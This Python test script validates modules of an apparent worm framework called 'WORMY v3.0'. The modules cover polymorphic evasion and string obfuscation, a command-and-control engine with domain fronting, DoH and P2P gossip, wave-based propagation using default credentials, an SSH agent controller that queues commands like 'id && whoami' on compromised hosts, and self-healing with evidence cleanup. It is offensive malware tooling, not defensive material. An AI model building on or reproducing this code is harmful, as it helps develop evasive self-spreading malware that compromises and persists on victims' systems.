"""
test_v2_modules.py
Validates all 5 new enterprise v2 modules:
  1. AdvancedPolymorphicEngine
  2. ResilientC2Engine
  3. WavePropagationEngine
  4. AgentController
  5. AdvancedSelfHealingEngine
"""

__test__ = False  # pytest marker: run as script, not auto-discovered

import hashlib
import os
import sys
import threading
import time

# Force UTF-8 stdout on Windows (avoids charmap codec errors)
if sys.stdout.encoding and sys.stdout.encoding.lower() != "utf-8":
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

WIDTH = 60
SEP = "=" * WIDTH
OK = "  [OK]"
FAIL = "  [FAIL]"

results = []


def check(label, ok, detail=""):
    tag = OK if ok else FAIL
    line = f"{tag} {label}"
    if detail:
        line += f": {detail}"
    print(line)
    results.append((label, ok))


print(SEP)
print("  WORMY v3.0 — ENTERPRISE v2 MODULE TESTS")
print(SEP)


# ─── 1. Advanced Polymorphic Engine ──────────────────────────────────────────
try:
    from evasion.advanced_polymorphic import (
        AdvancedPolymorphicEngine,
        ASTMetamorphTransformer,
        NetworkFingerprintRandomiser,
        StringObfuscator,
    )

    eng = AdvancedPolymorphicEngine(mutation_level=3, max_attempts=3)

    # String obfuscation round-trip
    obf = StringObfuscator()
    original = "hello_world_secret"
    obfuscated = obf.obfuscate(original)
    eval_result = eval(obfuscated)
    check("StringObfuscator round-trip", eval_result == original, f"'{original}' → expr OK")

    # Source mutation (AST-level)
    source = "x = 1 + 2\ny = x * 3\nresult = str(y)"
    mutated = eng.mutate_source(source)
    check(
        "AST mutation produces output",
        len(mutated) > len(source),
        f"orig={len(source)}b mutated={len(mutated)}b",
    )

    # Hash-uniqueness (different runs produce different hashes)
    h1 = hashlib.sha256(eng.mutate_source(source).encode()).hexdigest()
    h2 = hashlib.sha256(eng.mutate_source(source).encode()).hexdigest()
    # At least one of mutation_count must be recorded
    check(
        "Mutation stats tracked",
        eng.get_stats()["mutations_generated"] >= 2,
        f"generated={eng.get_stats()['mutations_generated']}",
    )

    # Network fingerprint randomisation
    fp = NetworkFingerprintRandomiser()
    headers1 = fp.random_headers()
    headers2 = fp.random_headers()
    check(
        "Network fingerprint randomised",
        headers1["User-Agent"] != headers2.get("User-Agent")
        or headers1.get("X-Request-ID") != headers2.get("X-Request-ID"),
        f"UA={headers1['User-Agent'][:30]}...",
    )

    delay = fp.random_timing(2000)
    check("Beacon jitter in range", 0.0 < delay < 30.0, f"delay={delay:.3f}s")

    path = fp.random_beacon_url_path()
    check("Beacon URL path generated", path.startswith("/"), f"path={path[:40]}")

except Exception as e:
    check("AdvancedPolymorphicEngine", False, str(e))

print()

# ─── 2. Resilient C2 Engine ──────────────────────────────────────────────────
try:
    from c2.resilient_c2 import (
        CommandQueue,
        DoHChannel,
        DomainFrontingChannel,
        P2PGossip,
        ResilientC2Engine,
        _decrypt,
        _encrypt,
    )

    # Encryption round-trip
    plaintext = '{"test": "payload", "value": 42}'
    passphrase = "test_pass"
    enc = _encrypt(plaintext, passphrase)
    dec = _decrypt(enc, passphrase)
    check("C2 encryption round-trip", dec == plaintext, f"{len(enc)}b ciphertext → decrypted OK")

    # Command queue (SQLite)
    import tempfile

    db_fd, db_path = tempfile.mkstemp(suffix=".db")
    os.close(db_fd)
    q = CommandQueue(db_path=db_path, passphrase=passphrase)
    q.enqueue({"action": "run", "cmd": "whoami"})
    q.enqueue({"action": "collect", "module": "intel"})
    pending = q.dequeue_pending()
    check("CommandQueue enqueue/dequeue", len(pending) == 2, f"{len(pending)} commands queued")
    q.mark_done(pending[0]["_queue_id"])
    after = q.dequeue_pending()
    check("CommandQueue mark_done", len(after) == 1, "1 command remaining after mark_done")
    os.unlink(db_path)

    # P2P Gossip (local only — no actual peers)
    p2p = P2PGossip(agent_id="test-agent", known_peers=[])
    # Start server in background
    p2p.start_server()
    time.sleep(0.2)
    # Gossip with empty peers (returns local data)
    merged = p2p.gossip({"hostname": "test-host", "users": ["root", "admin"]})
    p2p.stop()
    check("P2P Gossip local data", "hostname" in merged, f"keys={list(merged.keys())[:4]}")

    # ResilientC2Engine initialisation
    c2 = ResilientC2Engine(config=None, agent_id="testXX")
    c2.start(start_p2p=False)
    check(
        "ResilientC2Engine init",
        c2.agent_id == "testXX" and "https" in c2.protocol_health,
        f"protocols={list(c2.protocol_health.keys())}",
    )

    status = c2.get_status()
    check(
        "C2 status report",
        "beacon_count" in status and "protocol_health" in status,
        f"keys={list(status.keys())}",
    )

    # OTA update (mock bytes)
    import tempfile

    tmp_fd, tmp_path = tempfile.mkstemp(suffix=".pth")
    os.close(tmp_fd)
    ok = c2.deliver_ota_update(b"\x00" * 128, tmp_path)
    check(
        "OTA update delivery",
        ok and os.path.getsize(tmp_path) == 128,
        f"wrote 128b to {os.path.basename(tmp_path)}",
    )
    os.unlink(tmp_path)

except Exception as e:
    check("ResilientC2Engine", False, str(e))

print()

# ─── 3. Wave Propagation Engine ──────────────────────────────────────────────
try:
    from core.wave_propagation import (
        IntelHarvester,
        PivotScanner,
        PropagationGraph,
        SelfCopyTransfer,
        WavePropagationEngine,
    )

    # PropagationGraph
    graph = PropagationGraph()
    assert graph.can_infect("10.0.0.1")
    graph.mark_infected("10.0.0.1", source=None, wave=0)
    assert not graph.can_infect("10.0.0.1")
    graph.mark_failed("10.0.0.2")
    assert not graph.can_infect("10.0.0.2")
    stats = graph.get_stats()
    check(
        "PropagationGraph logic",
        stats["infected"] == 1 and stats["failed"] == 1,
        f"infected={stats['infected']} failed={stats['failed']}",
    )

    # WavePropagationEngine instantiation
    wpe = WavePropagationEngine(max_waves=2, max_workers=4)
    check(
        "WavePropagationEngine init",
        wpe.max_waves == 2 and wpe.graph is not None,
        f"max_waves={wpe.max_waves}",
    )

    # Mock exploit function — simulates 50% success
    import random

    call_count = [0]

    def mock_exploit(target):
        call_count[0] += 1
        success = random.random() > 0.5
        return success, {"service": "mock", "creds": None}

    targets = [
        {"ip": f"192.168.1.{i}", "open_ports": [22, 80], "asset_value": 10} for i in range(1, 6)
    ]
    wave_result = wpe.propagate_wave(
        targets=targets,
        credentials=[("admin", "admin"), ("root", "root")],
        exploit_fn=mock_exploit,
        wave=0,
    )
    check(
        "Wave 0 propagation ran",
        call_count[0] > 0 and "infected" in wave_result,
        f"called={call_count[0]} infected={len(wave_result['infected'])}"
        f" failed={len(wave_result['failed'])}",
    )

    # Verify graph updated
    g_stats = wpe.graph.get_stats()
    check(
        "Graph updated after wave",
        g_stats["infected"] + g_stats["failed"] == len(targets),
        f"total_tracked={g_stats['infected']+g_stats['failed']}/{len(targets)}",
    )

except Exception as e:
    check("WavePropagationEngine", False, str(e))

print()

# ─── 4. Agent Controller ─────────────────────────────────────────────────────
try:
    from core.agent_controller import (
        AgentController,
        AgentSession,
        QuickIntelCollector,
        SSHSessionManager,
    )

    # AgentSession dataclass
    s = AgentSession(ip="10.0.0.1", username="admin", password="pass123")
    check(
        "AgentSession created",
        s.agent_id and s.task_queue is not None,
        f"id={s.agent_id} idle={s.idle_seconds:.1f}s",
    )

    # AgentController basic
    ctrl = AgentController(heartbeat_interval=999, stale_threshold=600, max_workers=4)
    # Manually register without SSH (inject directly)
    from core.agent_controller import AgentSession

    fake_session = AgentSession(
        ip="192.168.1.99",
        username="root",
        password="toor",
        os_type="linux",
        asset_value=70,
        hostname="dc01",
    )
    ctrl._agents["abc12345"] = fake_session
    check(
        "Agent manually registered",
        "192.168.1.99" in [a.ip for a in ctrl._agents.values()],
        "agent in pool",
    )

    # Enqueue task
    ok = ctrl.enqueue_task("abc12345", "id && whoami")
    check(
        "Task enqueued",
        ok and not fake_session.task_queue.empty(),
        f"queue_size={fake_session.task_queue.qsize()}",
    )

    # enqueue_task_all (all agents)
    count = ctrl.enqueue_task_all("hostname", min_value=0)
    check("enqueue_task_all", count >= 1, f"queued on {count} agents")

    # get_best_pivots (rank by value)
    pivots = ctrl.get_best_pivots(top_n=3)
    check(
        "get_best_pivots",
        len(pivots) >= 1 and pivots[0].ip == "192.168.1.99",
        f"top pivot: {pivots[0].ip} (value={pivots[0].asset_value})",
    )

    # get_report
    report = ctrl.get_report()
    check(
        "Agent report",
        report["total_agents"] == 1 and report["alive_agents"] >= 0,
        f"total={report['total_agents']} avg_value={report['avg_asset_value']:.0f}",
    )

    ctrl.stop()

except Exception as e:
    check("AgentController", False, str(e))

print()

# ─── 5. Advanced Self-Healing Engine ─────────────────────────────────────────
try:
    from core.advanced_self_healing import (
        AdvancedSelfHealingEngine,
        EvidenceCleanup,
        ModuleIntegrityChecker,
        RePersistenceGuard,
    )

    base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

    # ModuleIntegrityChecker
    mic = ModuleIntegrityChecker(base_dir)
    baseline = mic.establish_baseline()
    check("Integrity baseline established", len(baseline) >= 1, f"{len(baseline)} modules hashed")

    results_integrity = mic.verify()
    tampered = [m for m, r in results_integrity.items() if r.get("tampered")]
    check(
        "Integrity verification (no tampering)",
        len(tampered) == 0,
        f"clean: {len(results_integrity)} modules checked",
    )

    # Modify a hash artificially to simulate AV tampering
    if baseline:
        first_module = list(baseline.keys())[0]
        mic._baseline[first_module] = "aaaa" * 16  # wrong hash
        recheck = mic.verify()
        detected = [m for m, r in recheck.items() if r.get("tampered")]
        mic._baseline[first_module] = baseline[first_module]  # restore
        check("Integrity detects tampering", len(detected) >= 1, f"detected: {detected[:2]}")

    # EvidenceCleanup (only cleans temp/logs — safe)
    ec = EvidenceCleanup(base_dir)
    cleaned = ec.clean_logs()
    check("EvidenceCleanup runs", isinstance(cleaned, int), f"{cleaned} files cleaned")

    # AdvancedSelfHealingEngine full init
    heal = AdvancedSelfHealingEngine(
        config=None, payload_path=os.path.join(base_dir, "worm_core.py")
    )
    health = heal.perform_health_check()
    check(
        "AdvancedSelfHealingEngine health check",
        "overall_health" in health and health["overall_health"] >= 0,
        f"overall={health['overall_health']:.1f}% repairs={health['repairs_performed']}",
    )

    heal.start(check_interval=9999, launch_guardian=False)
    time.sleep(0.1)
    heal.stop()
    check("Heal engine starts and stops", True, "thread daemon OK")

    # WormCore import sanity check
    try:
        from worm_core import WormCore

        check("WormCore import with v2 modules", True, "import OK")
    except Exception as e:
        check("WormCore import with v2 modules", False, str(e)[:80])

except Exception as e:
    check("AdvancedSelfHealingEngine", False, str(e))

# ─── Summary ─────────────────────────────────────────────────────────────────
print()
print(SEP)
passed = sum(1 for _, ok in results if ok)
failed = sum(1 for _, ok in results if not ok)
print(f"  PASSED: {passed}/{len(results)}   FAILED: {failed}")
if failed:
    print("\n  Failed checks:")
    for label, ok in results:
        if not ok:
            print(f"    ✗ {label}")
print(SEP)
sys.exit(0 if failed == 0 else 1)
